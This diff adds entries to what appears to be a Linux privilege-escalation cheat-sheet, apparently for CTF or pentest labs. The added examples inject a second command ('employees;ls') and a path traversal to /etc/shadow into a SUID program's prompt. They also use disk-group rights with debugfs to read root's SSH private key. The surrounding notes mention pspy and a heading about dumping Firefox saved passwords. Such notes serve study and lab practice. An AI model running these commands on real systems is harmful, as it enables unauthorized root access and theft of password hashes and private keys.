@@ -82,3 +82,22 @@ https://github.com/DominicBreuker/pspy/releases
 
 #Dumping Firefox Saved Passwords
 find / -type f -user elliot 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"
+
+#SUID example
+$ ./get-list
+Which List do you want to open? [customers/employees]: employees;ls
+$ ./get-list
+Which List do you want to open? [customers/employees]: ../../etc/shadow #employees
+
+#df Example
+
+$ id
+uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)
+$ df -h
+udev            1.9G     0  1.9G   0% /dev
+tmpfs           390M  1.9M  388M   1% /run
+/dev/sda5        20G  7.8G   11G  43% /
+
+$ debugfs /dev/sda5
+debugfs:  cd /root/.ssh
+debugfs:  cat id_rsa
